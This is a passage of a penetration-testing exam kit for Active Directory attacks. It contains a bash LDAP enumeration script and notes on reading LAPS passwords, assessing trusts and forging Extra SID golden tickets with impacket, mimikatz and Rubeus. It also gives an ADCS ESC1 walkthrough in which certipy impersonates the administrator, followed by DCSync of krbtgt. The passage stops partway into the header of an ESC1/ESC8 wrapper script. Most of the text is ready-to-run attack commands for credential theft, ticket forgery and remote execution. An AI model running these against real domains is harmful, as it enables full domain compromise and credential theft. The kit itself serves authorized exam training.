# BaseDN derivation: corp.local -> DC=corp,DC=local
if [ -z "$BASEDN" ]; then
    _IFS="$IFS"; IFS='.'; read -r -a _segs <<< "$DOMAIN"; IFS="$_IFS"
    _acc=""
    for seg in "${_segs[@]}"; do
        [ -z "$seg" ] && continue
        if [ -z "$_acc" ]; then _acc="DC=$seg"; else _acc="$_acc,DC=$seg"; fi
    done
    BASEDN="$_acc"
fi
# NetBIOS derivation: corp.local -> CORP
if [ -z "$NETBIOS" ]; then
    NETBIOS="$(printf '%s' "${DOMAIN%%.*}" | tr '[:lower:]' '[:upper:]')"
fi
BIND_DN="$NETBIOS\\$USER"
LDAP_URI="ldap://$DC"

mkdir -p "$OUTDIR" 2>/dev/null || err "cannot create the output directory ${OUTDIR} (does not affect print-only mode)"

info "target DC : $DC"
info "domain    : $DOMAIN (BaseDN=$BASEDN, NetBIOS=$NETBIOS)"
if [ -n "$USER" ]; then info "bind identity: $BIND_DN"; else info "bind identity: anonymous (-x; most domains refuse it, probe only)"; fi
[ "$DRY" = "1" ] && info "DRY RUN: print commands only"

# ---------- shared executor ----------
# Print a command line: only quote arguments containing spaces/quotes, so the output can be copy-pasted as is
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

# run_cmd <description> <command...>: print first, then execute unless dry; give a readable error if the command is missing
run_cmd() {
    local desc="$1"; shift
    head_ "$desc"
    printable "$@"
    if [ "$DRY" = "1" ]; then return 0; fi
    if ! have "$1"; then
        err "command missing on this host: $1 (Kali: sudo apt install -y ldap-utils nmap impacket-scripts, or pipx install the tool)"
        return 0
    fi
    "$@" 2>&1 || err "command returned non-zero (LDAP refusing anonymous / bad credentials / no network all look like this), check the output above"
    return 0
}

# ldap_search <filter> <attribute list (space separated)>
ldap_search() {
    local filter="$1" attrs="$2"
    if [ -n "$USER" ]; then
        run_cmd "LDAP: $filter" ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no \
            -D "$BIND_DN" -w "$PASS" -b "$BASEDN" "$filter" $attrs
    else
        run_cmd "LDAP: $filter" ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no \
            -b "$BASEDN" "$filter" $attrs
    fi
}

# ---------- mode implementations ----------
mode_base() {
    ldap_search "(objectClass=*)" "namingContexts"
    run_cmd "nmap ldap scripts (anonymous is enough; shows domain info and whether anonymous bind is allowed)" \
        nmap -n -sV --script "ldap* and not brute" -p 389 "$DC"
}

mode_users() {
    ldap_search "(&(objectClass=user)(objectCategory=person))" \
        "sAMAccountName userPrincipalName description pwdLastSet lastLogon memberOf adminCount"
    echo
    info "usernames only: ldapsearch ... '(&(objectClass=user)(objectCategory=person))' sAMAccountName | grep sAMAccountName:"
    info "grab AS-REP Roasting candidates (no pre-auth required, UAC 4194304):"
    printf '  ldapsearch -x -H %s -D "%s" -w PASS -b "%s" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName\n' \
        "$LDAP_URI" "$BIND_DN" "$BASEDN"
}

mode_computers() {
    ldap_search "(objectClass=computer)" \
        "sAMAccountName dnsHostName operatingSystem operatingSystemVersion lastLogon pwdLastSet"
}

mode_groups() {
    ldap_search "(objectClass=group)" "sAMAccountName member memberOf adminCount"
    echo
    info "privileged group members by well-known RID; querying by SID directly is more reliable:"
    for rid in 512 519 518 544; do
        printf '  ldapsearch -x -H %s -D "%s" -w PASS -b "CN=Users,%s" "(objectSid=<domainSID-%s>)" sAMAccountName member\n' \
            "$LDAP_URI" "$BIND_DN" "$BASEDN" "$rid"
    done
    info "(for groups not found under CN=Users use -b \"$BASEDN\" to search the whole directory with (objectSID=...))"
}

mode_spn() {
    ldap_search "(&(servicePrincipalName=*)(!(objectClass=computer)))" \
        "sAMAccountName servicePrincipalName memberOf adminCount pwdLastSet"
    echo
    info "Kerberoast (needs cleartext or NTHASH; produces tickets crackable with hashcat -m 13100):"
    printf '  impacket-GetUserSPNs -dc-ip %s -outputfile %s/spn.txt %s/%s:PASS\n' \
        "$DC" "$OUTDIR" "$NETBIOS" "$USER"
    printf '  hashcat -m 13100 %s/spn.txt /usr/share/wordlists/rockyou.txt\n' "$OUTDIR"
}

mode_delegation() {
    ldap_search "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
        "sAMAccountName dnsHostName"            # unconstrained delegation, TRUSTED_FOR_DELEGATION
    ldap_search "(msDS-AllowedToDelegateTo=*)" \
        "sAMAccountName msDS-AllowedToDelegateTo"   # constrained delegation
    ldap_search "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
        "sAMAccountName dnsHostName"                 # resource-based constrained delegation (has been written before)
    echo
    info "how to read this: unconstrained = UAC contains 524288; constrained = msDS-AllowedToDelegateTo has a value on the account;"
    info "for RBCD the target is written on the 'target computer' in msDS-AllowedToActOnBehalfOfOtherIdentity."
}

mode_laps() {
    info "query both LAPS generations at once (a missing attribute yields empty output, which tells you which version is deployed):"
    ldap_search "(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*))" \
        "sAMAccountName dnsHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-PasswordExpirationTime msLAPS-EncryptedPassword"
    echo
    info "legacy LAPS cleartext query (AdmPwd): -b \"$BASEDN\" \"(ms-Mcs-AdmPwd=*)\" dnshostname ms-Mcs-AdmPwd"
    info "Windows LAPS cleartext mode: swap the attributes above for msLAPS-Password / msLAPS-PasswordExpirationTime"
    info "if Windows LAPS only shows msLAPS-EncryptedPassword (DPAPI encrypted), plain LDAP cannot recover the cleartext;"
    info "you need Get-LapsADPassword on the target or the LAPS module on the DC -- see m12-laps-and-trust-notes.md"
}

# Trust attribute decoding table (used by the scenario 53 assessment)
print_trust_legend() {
    cat <<'EOF'

--- Decision table (map the values above onto these) ---------------------
trustDirection: 0=disabled  1=inbound (the other side can authenticate to this domain)  2=outbound (this domain can authenticate to the other side)  3=two-way
trustType     : 1=Downlevel(non-AD)  2=Uplevel(AD)  3=MIT(Kerberos v5)  4=DCE
trustAttributes key bits:
  0x00000020 (32)  WITHIN_FOREST  -> intra-forest (parent/child) trust, SID filtering off by default, Extra SID works
  0x00000008 (8)   FOREST_TRANSITIVE -> forest trust
  0x00000040 (64)  cross-forest bit other than FOREST_TRANSITIVE
  0x00000400 (1024) TREAT_AS_EXTERNAL / 0x00000004 QUARANTINED -> SID filtering is treated as external
Conclusion:
  WITHIN_FOREST(0x20) + outbound or two-way (2/3) -> the Extra SID golden ticket route in scenario 53 holds
  external/forest trust or QUARANTINED             -> SID filtering is on by default, Extra SID does not work, change path
-------------------------------------------------------------------------
EOF
}

mode_trust() {
    ldap_search "(objectClass=trustedDomain)" \
        "cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier"
    print_trust_legend
    echo
    info "Windows-side equivalent (run on a child domain host): nltest /domain_trusts /all_trusts"
    info "netexec side: netexec ldap $DC -u $USER -p 'PASS' -M enum_trusts"
    info "for the Extra SID golden ticket once you have the child krbtgt, see m12-laps-and-trust-notes.md"
}

# objectSid(base64) -> S-1-5-21-... (decode when python3 is available, otherwise print the base64 and an alternative command)
decode_sid_b64() {
    local b64="$1"
    if [ -n "$PYBIN" ]; then
        "$PYBIN" - "$b64" <<'PYEOF'
import base64, sys, struct
raw = base64.b64decode(sys.argv[1].strip())
rev, sub = raw[0], raw[1]
# identifier authority is 6 bytes big-endian, each subauthority is 4 bytes little-endian
ident = struct.unpack('>Q', b'\x00\x00' + raw[2:8])[0]
out = ["S-%d-%d" % (rev, ident)]
for i in range(sub):
    off = 8 + i * 4
    out.append(str(struct.unpack('<I', raw[off:off + 4])[0]))
print('-'.join(out))
PYEOF
    else
        echo "(python3 unavailable, objectSid(base64)=${b64}; use impacket-lookupsid to get the SID instead)"
    fi
}

mode_sid() {
    if [ -n "$USER" ] && have impacket-lookupsid; then
        run_cmd "domain SID (lookupsid, most reliable)" impacket-lookupsid "$NETBIOS/$USER:$PASS@$DC" 2
    else
        info "impacket-lookupsid unavailable or no credentials, falling back to LDAP objectSid and decoding it:"
        local b64
        if [ -n "$USER" ]; then
            b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -D "$BIND_DN" -w "$PASS" \
                   -b "$BASEDN" "(objectClass=domainDNS)" objectSid 2>/dev/null \
                   | awk '/^objectSid::/ {print $2; exit}')"
        else
            b64="$(ldapsearch -x -H "$LDAP_URI" -o ldif-wrap=no -b "$BASEDN" \
                   "(objectClass=domainDNS)" objectSid 2>/dev/null \
                   | awk '/^objectSid::/ {print $2; exit}')"
        fi
        printf 'ldapsearch ... "(objectClass=domainDNS)" objectSid\n'
        if [ -n "$b64" ]; then
            printf 'domain SID : %s\n' "$(decode_sid_b64 "$b64")"
            info "scenario 53 uses it for -extra-sid with the Enterprise Admins SID (domain SID + -519)"
        else
            err "no objectSid returned: anonymous was refused (add -u/-p) or the DC is unreachable"
        fi
    fi
}

mode_nmap() {
    run_cmd "full nmap LDAP script set" nmap -n -sV --script "ldap* and not brute" -p 389,636,3268,3269 "$DC"
}

mode_netexec() {
    if [ -n "$NTHASH" ]; then
        local creds="-u $USER -H $NTHASH"
    elif [ -n "$USER" ]; then
        local creds="-u $USER -p $PASS"
    else
        err "netexec mode needs -u/-p or -u/-H (NTHASH is only accepted by the netexec/bloodhound modes)"
        return 0
    fi
    run_cmd "netexec ldap (domain info + common modules)" netexec ldap "$DC" $creds \
        -M enum_trusts -M laps
    run_cmd "netexec smb (shares/signing/sessions)" netexec smb "$DC" $creds --shares
    run_cmd "netexec winrm (is remote execution possible)" netexec winrm "$DC" $creds
    info "module names vary by version: netexec ldap -L lists the available ones, then pick enum_trusts / laps / adcs"
}

mode_bloodhound() {
    if [ -n "$NTHASH" ]; then
        local creds="-u $USER --hashes 00000000000000000000000000000000:$NTHASH"
    elif [ -n "$USER" ]; then
        local creds="-u $USER -p $PASS"
    else
        err "bloodhound mode needs -u/-p or -u/-H"
        return 0
    fi
    run_cmd "bloodhound-python full collection (produces a zip in ${OUTDIR})" \
        bloodhound-python -c ALL $creds -d "$DOMAIN" -dc "$DC" -ns "$DC" --dns-tcp
    info "when collection finishes, copy $OUTDIR/*.zip back to your host and import it into BloodHound: sudo neo4j start && bloodhound"
    info "across network segments (over socks) prefix the command with proxychains and keep --dns-tcp"
}

case "$MODE" in
    all)
        mode_base; mode_users; mode_computers; mode_groups
        mode_spn; mode_delegation; mode_laps; mode_trust; mode_sid
        ;;
    base)       mode_base ;;
    users)      mode_users ;;
    computers)  mode_computers ;;
    groups)     mode_groups ;;
    spn)        mode_spn ;;
    delegation) mode_delegation ;;
    laps)       mode_laps ;;
    trust)      mode_trust ;;
    sid)        mode_sid ;;
    nmap)       mode_nmap ;;
    netexec)    mode_netexec ;;
    bloodhound) mode_bloodhound ;;
esac

printf '\n[*] finished mode: %s (output directory %s)\n' "$MODE" "$OUTDIR"
info "next: for LAPS hits see scenario 49; for delegation/RBCD hits see scenarios 51/52 (m12-delegation-attacks.ps1);"
info "      for trust + SID hits see scenario 53 (the Extra SID section of m12-laps-and-trust-notes.md)."
````

#### `m12-laps-and-trust-notes.md` {#m12-laps-and-trust-notes-md}

````markdown
# m12 - reading LAPS, domain/forest trust enumeration, Extra SID and SID filtering command notes

<!--
Purpose: command quick reference for LAPS (both the legacy AdmPwd and the Windows
      LAPS reading methods), domain/forest trust enumeration and assessment,
      Extra SID / SID history injection, and SID filtering caveats (pure notes,
      not an executable script).
Scenarios: M12 scenario 49 (read LAPS), 53 (child domain -> forest root: trust
      assessment + Extra SID).
Dependencies: on Linux, ldapsearch (ldap-utils) / netexec / impacket (ticketer,
      secretsdump) / bloodhound-python; on Windows, ADSI (built in), nltest
      (built in), PowerView or the AdmPwd.PS / LAPS PowerShell module (must be
      delivered or already present).
Usage: work through the sections in order; substitute the placeholders in the
      commands before pasting. For bulk enumeration from Linux use
      m12-ad-enum-linux.sh -m laps / -m trust, on Windows use
      m12-ad-enum-windows.ps1 -Mode LAPS.
Placeholders: DOMAIN=domain FQDN  TARGET=DC/host  USER/PASS/NTHASH=credentials  LHOST=attacker IP
      -- the corp.local / child.corp.local in these commands are illustrative
      domains, replace them with the real values from your exam environment.
Test status: command shapes are based on the cheat sheet "AD Enumeration / AD
      Attacking" and common target environment configurations; not verified line
      by line in a real multi-domain/multi-forest environment; trust the SIDs and
      trust attributes the target actually returns.
-->

> One-line principle: **assess before you act**. For LAPS, first establish the version (legacy `ms-Mcs-AdmPwd*` vs Windows LAPS
>
> `msLAPS-*`); across domains, first assess the trust attributes (is it `WITHIN_FOREST`, is the direction usable),
>
> and when the assessment says no, change path -- do not burn time on an impossible route.
>
> Placeholders: `DOMAIN` `TARGET` `USER` `PASS` `NTHASH` `LHOST`

---

## 1. Deciding the LAPS version (30 seconds)

```bash
# Linux: query all four attributes at once and see which one exists
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword

# Check only "is it installed" (the expiration attribute is readable by default domain users, the best existence test)
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwdExpirationTime=*)" dnshostname
```

| What you see | Meaning |
|---|---|
| An `ms-Mcs-AdmPwd` value | legacy LAPS, readable in cleartext -> use it for remote execution directly |
| Only `ms-Mcs-AdmPwdExpirationTime` and no password | legacy LAPS is deployed, but the current identity has **no read permission** |
| An `msLAPS-Password` value | Windows LAPS cleartext mode, readable directly |
| Only `msLAPS-EncryptedPassword` | Windows LAPS encrypted mode (DPAPI), plain LDAP cannot recover the cleartext |
| Nothing at all | LAPS is not deployed, or the NetBIOS/BaseDN is wrong |

---

## 2. Reading legacy LAPS (`ms-Mcs-AdmPwd`)

### Linux side

```bash
# single host
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(&(objectClass=computer)(sAMAccountName=WS02$))" \
  dnshostname ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
# whole domain in one sweep (fastest when you have read permission)
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" dnshostname ms-Mcs-AdmPwd

# netexec (when the matching module is available)
netexec ldap TARGET -u USER -p 'PASS' -M laps
netexec ldap TARGET -u USER -H NTHASH -M laps
```

### Windows side (no RSAT / no PowerView, pure ADSI)

```powershell
# whole domain: machines that have a password value
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*))").FindAll() |
  ForEach-Object { $_.Properties.dnshostname; $_.Properties.'ms-mcs-admpwd' }

# single host
([adsisearcher]"(&(objectCategory=computer)(sAMAccountName=WS02$))").FindOne().Properties.'ms-mcs-admpwd'

# existence test only (readable by any domain user)
([adsisearcher]"(&(objectCategory=computer)(ms-Mcs-AdmPwdExpirationTime=*))").FindAll().Count
```

### Windows side (with PowerView / AdmPwd.PS)

```powershell
Import-Module .\PowerView.ps1
Get-DomainComputer -Identity WS02 -Properties ms-Mcs-AdmPwd
Get-DomainComputer | Select-Object dnshostname,'ms-mcs-admpwd' | Where-Object { $_.'ms-mcs-admpwd' }

# official legacy LAPS module
Import-Module AdmPwd.PS
Get-AdmPwdPassword -ComputerName WS02
```

### Is the legacy LAPS client installed locally (to judge the version)

```powershell
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
```

---

## 3. Reading Windows LAPS (`msLAPS-*`)

```bash
# Linux: cleartext mode
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(msLAPS-Password=*)" dnshostname msLAPS-Password msLAPS-PasswordExpirationTime
```

```powershell
# Windows LAPS cleartext mode (PowerShell module)
Get-LapsADPassword -Identity WS02 -AsPlainText

# encrypted mode (msLAPS-EncryptedPassword, DPAPI protected):
#   plain LDAP / an unauthorized session cannot recover the cleartext; you need a
#   context that can decrypt on the target machine
Get-LapsADPassword -Identity WS02 -AsPlainText          # still the first choice in a privileged session
#   confirm the policy in the registry (Windows 11 / Server 2022+)
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Services\AdmPwd
```

**When encrypted mode will not give you the cleartext, do not grind on it**; three alternatives:
1. Switch to a machine still on legacy LAPS (domains often mix the two);
2. Switch to a machine where the `msLAPS-Password` cleartext policy is enabled;
3. Escalate first to an identity that can read the attribute, then come back and read it.

---

## 4. Who can read LAPS (readability troubleshooting)

```powershell
# PowerView: find principals with ReadProperty on ms-Mcs-AdmPwd
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
  Where-Object { ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } |
  ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier) -PassThru } |
  Select-Object IdentityName, ObjectDN
```

```bash
# Linux cross-check: first confirm who "you" are and which groups you are in
netexec ldap TARGET -u USER -p 'PASS' -M laps             # prints passwords directly when you have permission
bloodhound-python -c ACL -u USER -p 'PASS' -d DOMAIN -dc TARGET -ns TARGET --dns-tcp
# to inspect the ACLs on a target object use m12-ad-enum-windows.ps1 -Mode ACL
```

- The attribute exists but you cannot read it -> an ACL problem, not a tool problem;
- No value anywhere in the domain -> not deployed, or the reset cycle has not come round yet.

---

## 5. Using the LAPS password once you have it

```bash
# 445 open: the SMB/WMI family (LAPS manages the target machine's local Administrator)
impacket-wmiexec DOMAIN/Administrator@TARGET -p 'PASS'
impacket-psexec  DOMAIN/Administrator@TARGET -p 'PASS'
# only 5985 open: WinRM
evil-winrm -i TARGET -u Administrator -p 'PASS'
# when you have the hash
impacket-wmiexec DOMAIN/Administrator@TARGET -hashes :NTHASH
```

- **LAPS passwords are per machine**: the password for WS02 will not get you into WS03; confirm it is the same machine before you use it.
- Neither protocol open -> that password is useless right now, go back to enumeration and find another entry point.

---

## 6. Domain / forest trust enumeration

### Windows

```cmd
nltest /domain_trusts /all_trusts
nltest /trusted_domains
nltest /dclist:DOMAIN
```

```powershell
# with RSAT
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, ForestTransitive
(Get-ADForest).Domains
# without RSAT (ADSI)
([adsisearcher]"(objectClass=trustedDomain)").FindAll() |
  ForEach-Object { $_.Properties.cn; $_.Properties.trustpartner;
                  $_.Properties.trustattributes; $_.Properties.trustdirection }
```

### Linux

```bash
ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=trustedDomain)" \
  cn trustPartner trustAttributes trustDirection trustType flatName securityIdentifier

netexec ldap TARGET -u USER -p 'PASS' -M enum_trusts
./m12-ad-enum-linux.sh -m trust -s TARGET -D corp.local -u USER -p 'PASS'
```

---

## 7. Trust decision table (the core of scenario 53)

**trustDirection**: `0`=disabled · `1`=inbound (the other side can authenticate to this domain) · `2`=outbound (this domain can authenticate to the other side) · `3`=two-way

**trustType**: `1`=Downlevel(non-AD) · `2`=Uplevel(AD) · `3`=MIT(Kerberos v5) · `4`=DCE

**trustAttributes key bits**

| Value | Constant | Meaning / effect on Extra SID |
|---|---|---|
| `0x00000020` (32) | `WITHIN_FOREST` | **intra-forest (parent/child) trust**, SID filtering off by default -> Extra SID works |
| `0x00000008` (8) | `FOREST_TRANSITIVE` | forest trust, cross-forest |
| `0x00000004` (4) | `QUARANTINED` | quarantined, SID filtering treated as external -> Extra SID does not work |
| `0x00000400` (1024) | `TREAT_AS_EXTERNAL` | treated as an external trust -> SID filtering on |
| `0x00000040` (64) | `CROSS_ORGANIZATION` | cross-organization, treated as external |

**Conclusion**

- `WITHIN_FOREST(0x20)` + outbound or two-way (`2` / `3`) -> the Extra SID golden ticket route holds;
- external/forest trust, or `QUARANTINED` / `TREAT_AS_EXTERNAL` -> SID filtering is on by default, **Extra SID does not work**, change path (re-assess cross-domain ACLs, LAPS, delegation, ADCS);
- the direction is a one-way inbound "root -> child" -> the child domain cannot authenticate to the root, so neither inter-realm referral tickets nor Extra SID work.

---

## 8. Extra SID golden ticket (child domain -> forest root)

Prerequisites: ① the assessment above says intra-forest trust with a usable direction; ② you have the **child domain krbtgt NTLM**; ③ the child domain SID and the **root domain SID** (root domain SID + `-519` = Enterprise Admins).

```bash
# ① get krbtgt on the child DC (when you already have the child DA)
impacket-secretsdump -just-dc-user krbtgt DOMAIN/USER:'PASS'@TARGET

# ② get the root domain SID (in the root domain context)
impacket-lookupsid DOMAIN/USER:'PASS'@TARGET 2        # the domain SID in the output
# or use ldapsearch "(objectClass=domainDNS)" objectSid (see m12-ad-enum-linux.sh -m sid)

# ③ build a golden ticket carrying the Extra SID
impacket-ticketer -nthash <child krbtgt NT> -domain child.corp.local \
  -domain-sid <child domain SID> -extra-sid '<root domain SID>-519' Administrator

# ④ use the ticket against the root domain
export KRB5CCNAME=Administrator.ccache
klist -e
impacket-secretsdump -k -no-pass <root DC FQDN>
```

**Windows-side equivalent**

```cmd
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:<child domain SID> /krbtgt:<child krbtgt NT> /sids:<root domain SID>-519 /ptt
```
```powershell
.\Rubeus.exe golden /user:Administrator /domain:child.corp.local /sid:<child domain SID> /krbtgt:<child krbtgt NT> /sids:<root domain SID>-519 /ptt
```

- `-extra-sid` can only take **RID suffixes of the root domain SID**; the common values: `-519` (Enterprise Admins), `-512` (Domain Admins), `-518` (Schema Admins).
- Frequent mistakes: a mistyped root domain SID / forgetting the `-519` suffix / the root DC FQDN not resolving from `/etc/hosts`.

---

## 9. SID history injection and SID filtering caveats

**Injection** (stuffing a foreign domain SID into the PAC ExtraSids / SIDHistory):

```bash
impacket-ticketer -nthash NTHASH -domain DOMAIN -domain-sid <domain SID> -extra-sid '<target domain SID>-519' USER
```
```cmd
mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<domain SID> /krbtgt:NTHASH /sids:<target SID>-519 /ptt
```
```cmd
mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:<domain SID> /krbtgt:NTHASH /sids:<target SID> /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

**SID filtering (quarantine) essentials**

- Purpose: across a trust, the KDC **strips** SIDs that do not belong to its own forest (ExtraSids / SIDHistory), so an injected Enterprise Admins SID is dropped when filtering is on.
- Default behavior: intra-forest parent/child and tree-root trusts **do not filter**; external trusts and forest trusts **filter by default**; the `QUARANTINED` / `TREAT_AS_EXTERNAL` bits force external handling.
- A domain admin can turn filtering off with `netdom trust DOMAIN /domain:OTHER /quarantine:no` (requires EA rights; in an exam you basically should not count on it, and do not modify the target environment just for that).
- Assessment method: go back to section 7, read `trustAttributes`, do not rely on "let me just try it and see".
- Even with filtering off, check whether the target enables the `EnableSIDHistory` related policy and PAC validation; when you do not get the privileges you expect, `klist` / `whoami /groups` first to confirm the SID actually made it into the token.

**Verifying whether the Extra SID took effect**

```bash
klist -e                                     # was the ticket created, is the principal right
impacket-secretsdump -k -no-pass <root DC FQDN> # dumping the root domain krbtgt = it worked
```
```cmd
whoami /groups                               # after injecting /ptt you should see the Enterprise Admins SID
```

---

## 10. Failure branch quick reference

| Symptom | Diagnosis | Action |
|---|---|---|
| All LAPS attributes empty | not deployed / no read permission | enumerate other machines; or escalate first and read again; or move to RBCD/delegation/ADCS |
| Only the encrypted `msLAPS-EncryptedPassword` | Windows LAPS encrypted mode | find a legacy machine or one with the cleartext policy; do not grind on decryption |
| The password is right but you cannot get in | the password belongs to another machine | confirm the machine name, use the matching machine's password |
| Only 5985 open | SMB is not reachable | `evil-winrm`; if both protocols are closed, drop this path |
| The trust is external/forest | SID filtering on | Extra SID does not work, switch to cross-domain ACLs or another entry point |
| One-way and pointing the other way | the child domain cannot authenticate to the root | only other paths inside the root domain remain |
| Golden ticket authentication fails (TGS refused) | wrong SID/suffix/FQDN | check `-extra-sid` and the root DC resolution in `/etc/hosts` |
| No child krbtgt | you only control non-DC high privileges | move laterally inside the child domain to a DC first, then `secretsdump` |

---

## 11. Exam notes / OPSEC

- LAPS queries write LDAP audit logs; that is expected enumeration behavior; do **not** dump the whole domain and then try passwords at random, take only the machines the scenario needs.
- Do not leave passwords in your shell history as long cleartext command lines (use environment variables or script arguments).
- Golden ticket / Extra SID are the most sensitive operations inside a domain: only run them after the trust assessment holds, and clean up the `ccache` afterwards; `ticketer` only runs locally on the attacker box and delivers no files to the target.
- `/etc/hosts` must resolve the FQDNs of both the child DC and the root DC (Kerberos does not accept IPs); generate a template with
  `m12-kerberos-tickets-linux.sh -m hosts`.
- A clock skew >5 minutes makes every Kerberos operation fail; fix the time before you troubleshoot anything else.
````

## Scenario 54: A low-privilege domain user can request a misconfigured certificate template (ESC1)

**Situation**: ADCS is deployed in the domain; a published template meets the ESC1 conditions, and the current low-privilege user **has the right to request** it. Goal: use the certificate to obtain an administrator identity.

**ESC1 conditions (all four must hold at once)**: ① the template enables **enrollee-supplied SAN** (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, i.e. you can fill in `-upn`); ② the template EKU includes **Client Authentication** (`Client Authentication`, or it is an "Any Purpose" template, which you often meet in exams); ③ the template lets low-privilege users/groups **enroll** (enroll permission); ④ the template has **no** CA Manager Approval (with `CA Manager Approval` on, your request is left pending).

**Assumptions**: `certipy` (Kali: `certipy-ad`) is available; the attacker can resolve and reach the CA host (LDAP/DCERPC, `/etc/hosts` if needed); the FQDNs of the DC and the CA are known.

**Prepare (attacker side)**: run `certipy find` first for a full template enumeration that flags the exploitable ones (one enumeration gives you the CA name, the template list and who can enroll, so you do not have to guess).

**Procedure**:
```bash
# ① Enumerate: list -vulnerable templates and the principals that can enroll
certipy find -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local -vulnerable -stdout
# ② Request: impersonate administrator (put its UPN in the SAN)
certipy req -u USER@corp.local -p 'PASS' -ca 'CORP-CA' -target CA01.corp.local \
  -template 'VulnTemplate' -upn administrator@corp.local -dc-ip DC01.corp.local -out admin
# ③ Trade the certificate for the NTLM hash -> DCSync
certipy auth -pfx admin.pfx -dc-ip DC01.corp.local -domain corp.local
impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
```
**Scripts used**: `m12-adcs-esc1-esc8.sh` (a one-shot wrapper for enumerate/req/auth plus argument templates).

**Validation**: `certipy auth` prints the NTLM hash; if `secretsdump` can read `krbtgt` you are domain admin.

**Failure branches and alternatives**:
- `req` returns 0x80094012 / certificate policy does not match -> the template EKU lacks client authentication or the template is refused; try the next `-template` candidate (work from the full `certipy find` list rather than only the entries flagged vulnerable).
- `req` returns a permission error / is refused -> the current user has no enroll right on that template; the `-upn` user does not exist or the UPN does not match; check the four ESC1 conditions one by one.
- The request succeeds but `auth` fails -> a certificate subject/issuance time problem; re-run `req` and overwrite with `-out`; or specify `certipy auth -username administrator -domain corp.local` explicitly.
- CA name/host resolution fails -> take `CA Name` and the DNS host name from the `find` output and point `/etc/hosts` at the real CA IP; the `-target` argument can address the CA directly.
- No usable ESC1 template -> do not force it, jump to ESC8 (scenario 55) or another entry point.

**Exam / OPSEC notes**: `certipy find -vulnerable` output lists every problem template in the domain — only look at the ones the scenario needs. Requesting a certificate writes to the CA log, so pick an impersonation target that fits the scenario (an administrator/machine account); do not request unrelated certificates just to "test".

---

#### `m12-adcs-esc1-esc8.sh` {#m12-adcs-esc1-esc8-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# Purpose: wrappers for the two main ADCS routes -- ESC1 (a template whose
#       enrollee supplies the SAN, low privileges impersonate an administrator
#       directly) and ESC8 (relay NTLM to the ADCS HTTP enrollment endpoint and
#       trade it for a certificate), plus template enumeration, PFX -> ccache
#       handling and a dependency self-check. Every mode prints the full command
#       first, and only runs it when -x is given.
# Scenarios: M12 scenario 54 (a low-privilege domain user requests a
#       misconfigured certificate template) and scenario 55 (the CA exposes a
#       relayable HTTP enrollment endpoint).
# Dependencies: certipy (Kali 2023+ package name certipy-ad, pipx install
#       certipy-ad; older builds call it certipy, the script probes for both);
#       impacket (impacket-ntlmrelayx / impacket-petitpotam /
#       impacket-secretsdump, sudo apt install -y impacket-scripts); openssl (to
#       split the PFX).
# Usage: ./m12-adcs-esc1-esc8.sh -m deps
#       ./m12-adcs-esc1-esc8.sh -m find -d corp.local -s DC01.corp.local -u USER -p 'PASS'
#       ./m12-adcs-esc1-esc8.sh -m req  -d corp.local -s DC01.corp.local -c CA01.corp.local \
#            -n 'CORP-CA' -t 'VulnTemplate' -U administrator@corp.local -u USER -p 'PASS' -o admin
#       ./m12-adcs-esc1-esc8.sh -m auth -P admin.pfx -d corp.local -s DC01.corp.local
#       ./m12-adcs-esc1-esc8.sh -m relay -c CA01.corp.local -t Machine -l LHOST -V DC01.corp.local \
#            -d corp.local -s DC01.corp.local -u USER -p 'PASS'
# Placeholders (all passed as arguments, no real values inside the script):
#   DOMAIN = domain FQDN (-d)  TARGET = DC/CA host (-s / -c / -V)
#   USER / PASS / NTHASH = credentials (-u / -p / -H)  LHOST = attacker IP (-l, relay listener host)
#   URL = relay target endpoint (built from -c as http://CA01.corp.local/certsrv/certfnsh.asp)
# Test status: not tested against a real ADCS environment; bash -n passes locally.
#           Commands are printed only by default (-x executes), so you can check
